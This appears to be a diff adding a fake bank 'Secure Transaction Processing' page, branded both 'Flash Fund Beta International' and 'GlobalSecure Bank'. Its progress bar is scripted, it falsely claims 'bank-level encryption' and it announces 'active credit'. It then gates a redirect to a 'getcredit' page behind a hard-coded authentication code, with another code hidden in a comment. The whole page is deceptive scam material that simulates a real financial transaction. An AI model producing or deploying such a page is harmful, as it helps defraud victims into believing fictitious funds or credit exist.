@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <title>Secure Transaction Processing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            background: #1a2f6f;
+            background: -webkit-linear-gradient(315deg, #1a2f6f 0%, #0c4da2 100%);
+            background: linear-gradient(135deg, #1a2f6f 0%, #0c4da2 100%);
+            min-height: 100vh;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: flex;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            align-items: center;
+            padding: 20px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 20px;
+            -webkit-border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            -webkit-box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .header {
+            background: #2563eb;
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .processing-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .processing-text {
+            color: #2563eb;
+            font-weight: 600;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+
+        .progress-container {
+            height: 8px;
+            background-color: #e2e8f0;
+            border-radius: 4px;
+            -webkit-border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #2563eb;
+            background: -webkit-linear-gradient(left, #2563eb 0%, #059669 100%);
+            background: linear-gradient(90deg, #2563eb 0%, #059669 100%);
+            border-radius: 4px;
+            -webkit-border-radius: 4px;
+            -webkit-transition: width 0.5s ease;
+            transition: width 0.5s ease;
+        }
+
+        .loading-animation {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: flex;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            background-color: #cbd5e1;
+            border-radius: 50%;
+            -webkit-border-radius: 50%;
+            margin: 0 5px;
+        }
+
+        .dot:nth-child(1) {
+            -webkit-animation: pulse 1.5s infinite ease-in-out;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        .dot:nth-child(2) {
+            -webkit-animation: pulse 1.5s infinite ease-in-out 0.2s;
+            animation: pulse 1.5s infinite ease-in-out 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            -webkit-animation: pulse 1.5s infinite ease-in-out 0.4s;
+            animation: pulse 1.5s infinite ease-in-out 0.4s;
+        }
+
+        @-webkit-keyframes pulse {
+            0%, 100% {
+                -webkit-transform: scale(0.8);
+                transform: scale(0.8);
+                background-color: #cbd5e1;
+            }
+            50% {
+                -webkit-transform: scale(1.2);
+                transform: scale(1.2);
+                background-color: #2563eb;
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                -webkit-transform: scale(0.8);
+                transform: scale(0.8);
+                background-color: #cbd5e1;
+            }
+            50% {
+                -webkit-transform: scale(1.2);
+                transform: scale(1.2);
+                background-color: #2563eb;
+            }
+        }
+
+        .active-credit-message {
+            display: none;
+            background: #dcfce7;
+            border: 1px solid #86efac;
+            color: #166534;
+            padding: 20px;
+            border-radius: 12px;
+            -webkit-border-radius: 12px;
+            margin: 20px 0;
+            text-align: center;
+            -webkit-animation: fadeIn 0.5s ease;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .auth-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 100;
+            display: none;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            align-items: center;
+            -webkit-animation: fadeIn 0.3s ease;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .auth-content {
+            background: white;
+            border-radius: 16px;
+            -webkit-border-radius: 16px;
+            padding: 30px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            -webkit-box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            text-align: center;
+        }
+
+        .auth-title {
+            color: #2563eb;
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .auth-instructions {
+            color: #64748b;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #dbeafe;
+            border-radius: 10px;
+            -webkit-border-radius: 10px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            -webkit-transition: border-color 0.3s;
+            transition: border-color 0.3s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: #2563eb;
+        }
+
+        .success-message {
+            display: none;
+            background: #dcfce7;
+            border: 1px solid #86efac;
+            color: #166534;
+            padding: 20px;
+            border-radius: 12px;
+            -webkit-border-radius: 12px;
+            margin: 20px 0;
+            text-align: center;
+            -webkit-animation: fadeIn 0.5s ease;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .error-message {
+            display: none;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #dc2626;
+            padding: 15px;
+            border-radius: 12px;
+            -webkit-border-radius: 12px;
+            margin: 15px 0;
+            text-align: center;
+            -webkit-animation: shake 0.5s ease;
+            animation: shake 0.5s ease;
+        }
+
+        .btn {
+            display: inline-block;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            -webkit-border-radius: 10px;
+            padding: 15px 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            -webkit-transition: all 0.3s;
+            transition: all 0.3s;
+            text-align: center;
+            width: 100%;
+            -webkit-appearance: none;
+            appearance: none;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .btn:hover {
+            background: #1d4ed8;
+            -webkit-transform: translateY(-2px);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(37, 99, 235, 0.4);
+            -webkit-box-shadow: 0 5px 15px rgba(37, 99, 235, 0.4);
+        }
+
+        .btn:active {
+            -webkit-transform: translateY(0);
+            transform: translateY(0);
+        }
+
+        .btn-success {
+            background: #059669;
+        }
+
+        .btn-success:hover {
+            background: #047857;
+            box-shadow: 0 5px 15px rgba(5, 150, 105, 0.4);
+            -webkit-box-shadow: 0 5px 15px rgba(5, 150, 105, 0.4);
+        }
+
+        .security-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #64748b;
+        }
+
+        @-webkit-keyframes fadeIn {
+            from {
+                opacity: 0;
+                -webkit-transform: translateY(20px);
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                -webkit-transform: translateY(0);
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                -webkit-transform: translateY(20px);
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                -webkit-transform: translateY(0);
+                transform: translateY(0);
+            }
+        }
+
+        @-webkit-keyframes shake {
+            0%, 100% {
+                -webkit-transform: translateX(0);
+                transform: translateX(0);
+            }
+            25% {
+                -webkit-transform: translateX(-10px);
+                transform: translateX(-10px);
+            }
+            75% {
+                -webkit-transform: translateX(10px);
+                transform: translateX(10px);
+            }
+        }
+
+        @keyframes shake {
+            0%, 100% {
+                -webkit-transform: translateX(0);
+                transform: translateX(0);
+            }
+            25% {
+                -webkit-transform: translateX(-10px);
+                transform: translateX(-10px);
+            }
+            75% {
+                -webkit-transform: translateX(10px);
+                transform: translateX(10px);
+            }
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #64748b;
+            font-size: 12px;
+            border-top: 1px solid #e2e8f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Flash Fund Beta International</div>
+            <div class="subtitle">Secure Transaction Processing</div>
+        </div>
+
+        <div class="content">
+            <div class="processing-container">
+                <div class="processing-text">
+                    <i class="fas fa-lock"></i> Processing your transaction securely...
+                </div>
+
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+
+                <div class="loading-animation">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+
+            <div class="active-credit-message" id="activeCreditMessage">
+                <i class="fas fa-exclamation-circle" style="font-size: 40px; margin-bottom: 15px;"></i>
+                <h3 style="margin-bottom: 10px;">You Now Have Active Credit and Services</h3>
+                <p style="margin-bottom: 20px;">Click continue to complete your transaction</p>
+                <button class="btn" id="continueBtn">Continue</button>
+            </div>
+            <!--<i class="fas fa-check-circle"--->
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle" style="font-size: 40px; margin-bottom: 15px;"></i>
+                <h3 style="margin-bottom: 10px;">Authorise Successful!</h3>
+                <p>Your transaction has been successfully authorised. Redirecting...</p>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle" style="font-size: 40px; margin-bottom: 15px;"></i>
+                <h3 style="margin-bottom: 10px;">Invalid Access Code</h3>
+                <p>Please check your code and try again.</p>
+            </div>
+
+            <div class="security-note">
+                <i class="fas fa-shield-alt"></i> Your transaction is secured with bank-level encryption
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 GlobalSecure Bank. All rights reserved.
+        </div>
+    </div>
+
+    <div class="auth-modal" id="authModal">
+        <div class="auth-content">
+            <div class="auth-title">
+                <i class="fas fa-shield-alt"></i> Authentication Required
+            </div>
+            <p class="auth-instructions">Please enter your authentication code to authorise the transaction</p>
+
+            <input type="text" class="code-input" id="authCode" placeholder="Enter authentication code">
+
+            <button class="btn btn-success" id="completeTransactionBtn">Completing Transaction</button>
+
+            <p style="margin-top: 15px; font-size: 12px; color: #64748b;">
+                For security reasons, please access code<!---Flashfundbeta00232-->
+            </p>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        (function () {
+            'use strict';
+
+            var progressBar;
+            var activeCreditMessage;
+            var authModal;
+            var authCodeInput;
+            var completeTransactionBtn;
+            var successMessage;
+            var errorMessage;
+            var continueBtn;
+
+            var progress = 0;
+            var progressInterval = null;
+            var CORRECT_CODE = 'E543455861123';
+            var REDIRECT_URL = 'https://flashservice.com.ng/flashfundbetaInter/getcredit/creditpage.html';
+
+            function startProcessing() {
+                progressBar = document.getElementById('progressBar');
+                activeCreditMessage = document.getElementById('activeCreditMessage');
+                authModal = document.getElementById('authModal');
+                authCodeInput = document.getElementById('authCode');
+                completeTransactionBtn = document.getElementById('completeTransactionBtn');
+                successMessage = document.getElementById('successMessage');
+                errorMessage = document.getElementById('errorMessage');
+                continueBtn = document.getElementById('continueBtn');
+
+                progressInterval = setInterval(function () {
+                    progress += 10;
+                    progressBar.style.width = progress + '%';
+
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
+                        progressInterval = null;
+
+                        setTimeout(function () {
+                            activeCreditMessage.style.display = 'block';
+                        }, 500);
+                    }
+                }, 1000);
+
+                continueBtn.addEventListener('click', function () {
+                    activeCreditMessage.style.display = 'none';
+                    authModal.style.display = '-webkit-box';
+                    authModal.style.display = '-webkit-flex';
+                    authModal.style.display = 'flex';
+                });
+
+                completeTransactionBtn.addEventListener('click', function () {
+                    var enteredCode = authCodeInput.value.replace(/^\s+|\s+$/g, '');
+
+                    if (enteredCode === CORRECT_CODE) {
+                        authModal.style.display = 'none';
+                        successMessage.style.display = 'block';
+
+                        setTimeout(function () {
+                            try {
+                                window.location.href = REDIRECT_URL;
+                            } catch (e) {
+                                try {
+                                    window.location.replace(REDIRECT_URL);
+                                } catch (e2) {
+                                    window.open(REDIRECT_URL, '_self');
+                                }
+                            }
+                        }, 10000);
+                    } else {
+                        errorMessage.style.display = 'block';
+
+                        setTimeout(function () {
+                            errorMessage.style.display = 'none';
+                        }, 3000);
+                    }
+                });
+            }
+
+            if (document.addEventListener) {
+                document.addEventListener('DOMContentLoaded', startProcessing, false);
+            } else if (document.attachEvent) {
+                document.attachEvent('onreadystatechange', function () {
+                    if (document.readyState === 'complete') {
+                        startProcessing();
+                    }
+                });
+            } else {
+                window.onload = startProcessing;
+            }
+        })();
+    </script>
+</body>
+</html>
